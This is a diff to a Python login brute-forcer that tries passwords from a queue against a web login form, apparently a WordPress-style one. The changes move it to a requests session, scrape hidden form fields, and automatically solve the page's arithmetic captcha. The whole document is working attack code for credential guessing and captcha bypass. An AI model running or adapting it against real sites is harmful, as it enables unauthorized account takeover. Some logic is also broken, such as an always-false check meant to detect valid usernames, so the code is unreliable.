@@ -4,6 +4,7 @@ import cookielib
 import threading
 import sys
 import Queue
+import requests
 
 from HTMLParser import HTMLParser
 
@@ -65,18 +66,18 @@ class Bruter(object):
             brute = self.password_q.get().rstrip()
             #creating a cookielib object to handle the cookies
             #cookie will be store in the file "cookies"
-            jar = cookielib.FileCookieJar("cookies")
-            opener = urllib2.build_opener(urllib2.HTTPCookieProcessor(jar))
-            response = opener.open(self.target_url)
-            page = response.read()
-#            print('Here is the page')
-#            print(page)
+
+            #we use a session object here, so it handles the cookies for us
+            session = requests.Session()
+            response = session.get(self.target_url)
+            page = response.text
 
             print "Trying: %s : %s (%d left)" % (self.username,brute,
                     self.password_q.qsize())
             
             # parse out the hidden fields
             parser = BruteParser()
+
             #This method feed the html code received to the 
             #BruteParser. The over written handle_starttag 
             #method will take care of modifying it.
@@ -97,18 +98,20 @@ class Bruter(object):
 
                 #compute the captcha value
                 captcha_value = captcha_handler.compute_captcha_value()
+                post_tags['ux_txt_captcha_input'] = captcha_value
 
 
             # add our username and password fields
             post_tags[self.username_field] = self.username
             post_tags[self.password_field] = brute
-            post_tags['ux_txt_captcha_input'] = captcha_value
+            #post_tags['wp-submit'] = 'submit'
             login_data = urllib.urlencode(post_tags)
 
-            #Not sure we really need a target_post here.
-            login_response = opener.open(self.target_post, login_data)
-            login_result = login_response.read()
-            #print(login_result)
+            login_response = session.post(self.target_post, data=post_tags)
+
+            # print the html returned or something more intelligent to see if it's a successful login page.
+            login_result = login_response.text
+
 
             if not "Invalid username":
                 print("Username %s is valid"%self.username)
@@ -153,10 +156,11 @@ class Bruter(object):
                 captcha_handler = CaptchaHandler()
                 captcha_handler.value1 = parser.data_captcha_block[3]
                 captcha_handler.value2 = parser.data_captcha_block[4].replace('=','')
-                captcha_handler.operator = parser.entityref_captcha_block
+                captcha_handler.operator = parser.charref_captcha_block or parser.entityref_captcha_block 
 
                 #compute the captcha value
-                captcha_value = captcha_handler.compute_captcha_value(page)
+                captcha_value = captcha_handler.compute_captcha_value()
+                post_tags['ux_txt_captcha_input'] = captcha_value
 
             # add our username and password fields
             post_tags[self.username_field] = brute
